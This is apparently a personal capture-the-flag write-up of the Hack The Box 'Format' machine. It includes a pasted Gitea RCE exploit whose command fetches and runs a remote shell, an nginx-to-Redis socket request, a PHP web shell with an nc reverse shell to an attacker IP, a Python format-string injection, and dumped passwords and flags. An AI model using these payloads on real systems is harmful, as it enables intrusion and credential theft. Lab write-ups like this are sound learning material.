
I have three ports open on this machine
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

lets see the services and versions... and if we have some exploit


```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45:cd:f2:0b:05:4f (RSA)
|   256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA)
|_  256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0
3000/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


On the port 3000 its running microbiolog.htb and works with gitea

![[Screenshot_2023-09-15_11_48_05 1.png]]

```
Powered by Gitea Version: 1.17.3 Page: **1ms** Template : **1ms**
```

and in http://app.microblog.htb/ on the port 80 we have another site, where we can log in and register


![[Screenshot_2023-09-15_11_47_55.png]]


whatweb  on port 80

```
┌──(cds㉿kali)-[~/Documents/htb/10.10.11.213-format/nmap]
└─$ whatweb http://10.10.11.213:80                                       
http://10.10.11.213:80 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.213], Meta-Refresh-Redirect[http://app.microblog.htb], nginx[1.18.0]                                                                                                                                                          
http://app.microblog.htb [200 OK] Cookies[username], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.213], JQuery, Script, Title[Microblog], nginx[1.18.0]

```

whatweb on port 3000

```
┌──(cds㉿kali)-[~/Documents/htb/10.10.11.213-format/nmap]
└─$ whatweb http://10.10.11.213:3000
http://10.10.11.213:3000 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.213], RedirectLocation[http://microblog.htb:3000/], Title[301 Moved Permanently], nginx[1.18.0]
http://microblog.htb:3000/ [200 OK] Cookies[_csrf,i_like_gitea,macaron_flash], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[_csrf,i_like_gitea,macaron_flash], IP[10.10.11.213], Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, Title[Microblog], X-Frame-Options[SAMEORIGIN], nginx[1.18.0]
                                         
```

I found this:


http://microblog.htb:3000/cooper/microblog

this is like the repository of gitea that we can edit the git repository , or contribute to the project.

On the target we can se that here is the repository 

I need credentials to get inside

The person who created this is a person called cooper

```/var/www/microblog/```

```
|   |
|---|
|`function provisionProUser() {`|
|||||`if(isPro() === "true") {`|
|||||`$blogName = trim(urldecode(getBlogName()));`|
|||||`system("chmod +w /var/www/microblog/" . $blogName);`|
|||||`system("chmod +w /var/www/microblog/" . $blogName . "/edit");`|
|||||`system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");`|
|||||`system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");`|
|||||`system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);`|
|||||`}`|
|||||`return;`|
```

Its using redis

¿What is redis ?

Redis es un motor de base de datos en memoria, basado en el almacenamiento en tablas de hashes pero que opcionalmente puede ser usada como una base de datos durable o persistente. Está escrito en ANSI C por Salvatore Sanfilippo, quien es patrocinado por Redis Labs.

```
|   |
|---|
|`function checkOwner() {`|
|||||`if(checkAuth()) {`|
|||||`$redis = new Redis();`|
|||||`$redis->connect('/var/run/redis/redis.sock');`|
|||||`$subdomain = array_shift((explode('.', $_SERVER['HTTP_HOST'])));`|
|||||`$userSites = $redis->LRANGE($_SESSION['username'] . ":sites", 0, -1);`|
|||||`if(in_array($subdomain, $userSites)) {`|
|||||`return $_SESSION['username'];`|
|||||`}`|
|||||`}`|
|||||`return "";`|
|||||`}`|



||||||
|||||`function getFirstName() {`|
|||||`if(isset($_SESSION['username'])) {`|
|||||`$redis = new Redis();`|
|||||`$redis->connect('/var/run/redis/redis.sock');`|
|||||`$firstName = $redis->HGET($_SESSION['username'], "first-name");`|
|||||`return "\"" . ucfirst(strval($firstName)) . "\"";`|
|||||`}`|
|||||`}`|
```

There is a gitea api too version  1.17.3

http://microblog.htb:3000/api/swagger#/

There is a license.txt

http://microblog.htb:3000/assets/js/licenses.txt


Ok, I create a blog called "test"

and I can do alerts.. some sort of XSS

```<srcipt>alert(Document.cookie)</script>
```

![[Screenshot_2023-09-15_14_52_59.png]]

So... I have no much skills about XSS but I need to investigate what im able to do with this.

This is strange because when this alert appears i'm in a "pro version" and im able to upload images, otherwise i just can put the h1 and the txt..

![[Screenshot_2023-09-15_15_05_38.png]]

This is strange XSS affects just the clients, not the server.. so i'm able to pwn clients and steal sessions, but I cant do many things to the server side.

When I see the petition with burpsuit this server Is redirecting me 

![[Screenshot_2023-09-15_15_23_20.png]]

![[Screenshot_2023-09-15_15_23_56.png]]

![[Screenshot_2023-09-15_15_24_08.png]]

This gitea has a vulnerability of remote code execution. BUUT WE NEED TO HAVE CREDENTIALS THIS IS THE EXPLOIT


https://www.exploit-db.com/exploits/49383
```
```py
# Exploit Title: Gitea 1.7.5 - Remote Code Execution
# Date: 2020-05-11
# Exploit Author: 1F98D
# Original Author: LoRexxar
# Software Link: https://gitea.io/en-us/
# Version: Gitea before 1.7.6 and 1.8.x before 1.8-RC3
# Tested on: Debian 9.11 (x64)
# CVE: CVE-2019-11229
# References:
# https://medium.com/@knownsec404team/analysis-of-cve-2019-11229-from-git-config-to-rce-32c217727baa
#
# Gitea before 1.7.6 and 1.8.x before 1.8-RC3 mishandles mirror repo URL settings,
# leading to authenticated remote code execution.
# 
#!/usr/bin/python3

import re
import os
import sys
import random
import string
import requests
import tempfile
import threading
import http.server
import socketserver
import urllib.parse
from functools import partial

USERNAME = "test"
PASSWORD = "password123"
HOST_ADDR = '192.168.1.1'
HOST_PORT = 3000
URL = 'http://192.168.1.2:3000'                                                                                                                                                                          
CMD = 'wget http://192.168.1.1:8080/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell'                                                                                                             
                                                                                                                                                                                                             
# Login                                                                                                                                                                                                      
s = requests.Session()                                                                                                                                                                                       
print('Logging in')                                                                                                                                                                                          
body = {                                                                                                                                                                                                     
    'user_name': USERNAME,                                                                                                                                                                                   
    'password': PASSWORD                                                                                                                                                                                     
}                                                                                                                                                                                                            
r = s.post(URL + '/user/login',data=body)                                                                                                                                                                    
if r.status_code != 200:                                                                                                                                                                                     
    print('Login unsuccessful')                                                                                                                                                                              
                                                                                                                                                                                                             
    sys.exit(1)                                                                                                                                                                                              
print('Logged in successfully')                                                                                                                                                                              

# Obtain user ID for future requests
print('Retrieving user ID')
r = s.get(URL + '/')
if r.status_code != 200:
    print('Could not retrieve user ID')
    sys.exit(1)

m = re.compile("<meta name=\"_uid\" content=\"(.+)\" />").search(r.text)
USER_ID = m.group(1)
print('Retrieved user ID: {}'.format(USER_ID))

# Hosting the repository to clone
gitTemp = tempfile.mkdtemp()
os.system('cd {} && git init'.format(gitTemp))
os.system('cd {} && git config user.email x@x.com && git config user.name x && touch x && git add x && git commit -m x'.format(gitTemp))
os.system('git clone --bare {} {}.git'.format(gitTemp, gitTemp))
os.system('cd {}.git && git update-server-info'.format(gitTemp))
handler = partial(http.server.SimpleHTTPRequestHandler,directory='/tmp')
socketserver.TCPServer.allow_reuse_address = True
httpd = socketserver.TCPServer(("", HOST_PORT), handler)
t = threading.Thread(target=httpd.serve_forever)
t.start()
print('Created temporary git server to host {}.git'.format(gitTemp))

# Create the repository
print('Creating repository')
REPO_NAME = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
body = {
    '_csrf': urllib.parse.unquote(s.cookies.get('_csrf')),
    'uid': USER_ID,
    'repo_name': REPO_NAME,
    'clone_addr': 'http://{}:{}/{}.git'.format(HOST_ADDR, HOST_PORT, gitTemp[5:]),
    'mirror': 'on'
}
r = s.post(URL + '/repo/migrate', data=body)
if r.status_code != 200:
    print('Error creating repo')
    httpd.shutdown()
    t.join()
    sys.exit(1)
print('Repo "{}" created'.format(REPO_NAME))

# Inject command into config file
print('Injecting command into repo')
body = {
    '_csrf': urllib.parse.unquote(s.cookies.get('_csrf')),
    'mirror_address': 'ssh://example.com/x/x"""\r\n[core]\r\nsshCommand="{}"\r\na="""'.format(CMD),
    'action': 'mirror',
    'enable_prune': 'on',
    'interval': '8h0m0s'
}
r = s.post(URL + '/' + USERNAME + '/' + REPO_NAME + '/settings', data=body)
if r.status_code != 200:
    print('Error injecting command')
    httpd.shutdown()
    t.join()
    sys.exit(1)
print('Command injected')

# Trigger the command
print('Triggering command')
body = {
    '_csrf': urllib.parse.unquote(s.cookies.get('_csrf')),
    'action': 'mirror-sync'
}
r = s.post(URL + '/' + USERNAME + '/' + REPO_NAME + '/settings', data=body)
if r.status_code != 200:
    print('Error triggering command')
    httpd.shutdown()
    t.join()
    sys.exit(1)

print('Command triggered')

# Shutdown the git server
httpd.shutdown()
```


Im using gobuster.. to see if i'm able to find something 

```
gobuster dir -u http://app.microblog.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20  -x txt,html,php
```


And here where is the license too...

```
gobuster dir -u http://microblog.htb:3000/assets/js/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20  -x txt,html,php
```

and here 

```
gobuster dir -u http://microblog.htb:3000/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20  -x txt,html,php 
```


I found nothing in this way... I will try 

```
ffuf -c -w /usr/share/amass/wordlists/subdomains-top1mil-20000.txt -u http://FUZZ.microblog.htb
```

On this way I found "sunny.microblog.htb"  but i think this is not so interesting... strange. On the gitea I see something like this. 

Ok, at this point my mind is blowing, and I dont know what to do, I get a hint and I was able to know that the id parameter is vulnerable to a LFI..... ssssssssht. Sometimes is hard to be focus and be able to see al the possible vulnerabilities even more when you're a script kiddie like me.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologinsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
cooper:x:1000:1000::/home/cooper:/bin/bashredis:x:103:33::/var/lib/redis:/usr/sbin/nologin
git:x:104:111:Git Version Control,,,:/home/git:/bin/bashmessagebus:x:105:112::/nonexistent:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false
```

Another hint.... to get pro we need to use this command , i know that this is using redis...I saw on the source code... but im feeling very upset right now,  because I don't feel able to find this command by myself ? how this person did it ? 

https://redis.io/commands/hset/


```
curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:testy%20pro%20true%20a/b
```

I will stop for today, I feel realy realy realy upset...


Ok Its a new day and I did my first wifi attack (of course in a controlled environment) and it was successfull.. you know intercepting the  three way handshake.



But, lets continue with this...

![[Screenshot_2023-09-16_08_40_30.png]]

HGET returns the value of a hash.. but why after http://microblog this is writed "/static/unix:%2fvar%2frun%2fredis%2fredis.sock:testy%20pro%20true%20a/b"




in the index says something about the "HGET" 
```
|   |
|---|
|`if (isset($_POST['username']) && isset($_POST['password'])) {`|
||`$redis = new Redis();`|
||`$redis->connect('/var/run/redis/redis.sock');`|
||`$username = $redis->HGET(trim($_POST['username']), "username");`|
||`if(strlen(strval($username)) > 0) {`|
||`if(strval($redis->HGET(trim($_POST['username']), "username")) == trim($_POST['username']) && strval($redis->HGET(trim($_POST['username']), "password")) == trim($_POST['password'])) {`|
||`$_SESSION['username'] = trim($_POST['username']);`|
||`header("Location: /dashboard?message=Login successful!&status=success");`|
||`}`|
||`else {`|
||`header("Location: /login?message=Login failed&status=fail");`|
||`}`|
||`}`|
||`else {`|
||`header("Location: /login?message=Login failed&status=fail");`|
||`}`|


```

NOW I UNDERSTAND !!

THIS IS THE PATH OF redis
```
/var/run/redis/redis.sock
```

This is the petition i think .. to that path where IS THE USER 
```
/static/unix:%2fvar%2frun%2fredis%2fredis.sock:testy%20pro%20true%20a/b"
```


So... I did this

```
┌──(cds㉿kali)-[~/Documents/htb/10.10.11.213-format/content]
	└─$ curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:test%20pro%20true%20a/b
<html>
<head><title>502 Bad Gateway</title></head>
<body>
<center><h1>502 Bad Gateway</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>
```

And I have the pro and now I can put images .... but it is a rabbit hole the way to get a reverse shell is different on we must inject code on the parameter ID , of course this was a hint for me , this machine is resulting very frustrating.. but on the process I'm learning new concepts. Hacking is not necessarily easy.... I think this is the opposite. 

```
id=/var/www/microblog/test/uploads/rev.php&txt=<%3fphp+echo+shell_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.16.35+443+>/tmp/f")%3b%3f>
```


So... i think this of the get the "pro" was a rabbit hole to.

Ok, after a biiig strugle I get the reverse shell, that is because when you add the /rev.php file you must go then to the folder where is uploaded. This is on test.microblog.htb/uploads/rev.php 

If you dont go there the reverse shell never executes itself ... now we must set a decent tty.

script -c /dev/null

stty raw -echo ; fg

reset xterm

export TERM=xterm

now we have a cli more friendly

This isnt work, maybe python3 -c 'import pty;pty.spawn("/bin/bash")'


/home/cooper/user.txt
Ok, I can go to the cooper user folder but I cant read the flag of the user.txt


I execute the pspy on the machine.. first I put the file with a python server fom my machine and im watching the process on the machine...

sudo -l doesnt give me nothing.. i have no password

id , im in no group, and i have no permisions


im www-data...

This is a process executing on the machine

```
/usr/bin/redis-server 127.0.0.1:0
```

Apparently I have to do this firlst

```
www-data@format:/home/cooper$ redis-cli -s /run/redis/redis.sock 
redis /run/redis/redis.sock> KEYS * 
1) "cooper.dooper:sites" 
2) "cooper.dooper" 
3) redis /run/redis/redis.sock> TYPE cooper.dooper hash
```
THEN :

```
redis /run/redis/redis.sock> HGETALL cooper.dooper 
1) "username" 
2) "cooper.dooper" 
3) "password" 
4) "zooperdoopercooper" 
5) "first-name" 
6) "Cooper" 
7) "last-name" 
8) "Dooper" 
9) "pro" 
10) "false"
```


Now I use 

su cooper

and now im cooper and i can cat the flag

user.txt
a5c970eb908ae90e10afbeea49a17229


sudo -l tells us this :
```
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license

```

Its a python script

```c
cooper@format:~$ cat /usr/bin/license
#!/usr/bin/python3

import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys

class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()

if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()

parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()

r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')

secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

f = Fernet(encryption_key)
l = License()

#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")

#deprovision
if(args.deprovision):
    print("")
    print("License key deprovisioning coming soon")
    print("")
    sys.exit()

#check
if(args.check):
    print("")
    try:
        license_key_decrypted = f.decrypt(args.check.encode())
        print("License key valid! Decrypted value:")
        print("------------------------------------------------------")
        print(license_key_decrypted.decode())
    except:
        print("License key invalid")
    print("")

```

a person says that we have a "Python format string vulnerability"

https://podalirius.net/en/articles/python-format-string-vulnerabilities/

```c

cooper@format: redis-cli -s /run/redis/redis.sock

redis /var/run/redis/redis.sock> HMSET test first-name "{license.__init__.__globals__[secret_encoded]}" last-name test username test 
OK 
redis /var/run/redis/redis.sock> exit 
cooper@format:~$ sudo /usr/bin/license -p test 
Plaintext license key:
------------------------------------------------------ 
microblogtestAv*pd5bU$#)!Ef@un(7nX!vkA;)|AD:A}e/DET{tb'unCR4ckaBL3Pa$$w0rd'test Encrypted license key (distribute to customer): 
------------------------------------------------------ gAAAAABkZBqEo0E7jcv6FFBjGKoCi238MGNfhobcAFoqmkKXW0WJD0Sn1JuKMymKAEfTdV2Pz-zYlVuKrKgDZJp7ft-R4b8LxkeFwerwg85tIjvgDNK-PKp_H9x4WhR0zydRMPAKB77EsK6rJfsg9_JxOlne9U9mC9ed0onBt5UHNfsqUwH6wRI=
```

AND FINALLY WE CONNECT AS ROOT, AND CAT THE FLAG...


```
cooper@format:~$ su root 
Password: 
root@format:/home/cooper# 
cat /root/root.txt 
fdb57fdc6ee411835663ddfb6822b8d1 
root@format:/home/cooper#
```

This machine was really hard for me and out of my capabilities, without a guide I was not able to solve it ... this abut redis is very strange and I'm not able yet to understand this server... at least I know where I have a lack of knowlodge... 
I feel frustrated but at least the life continues...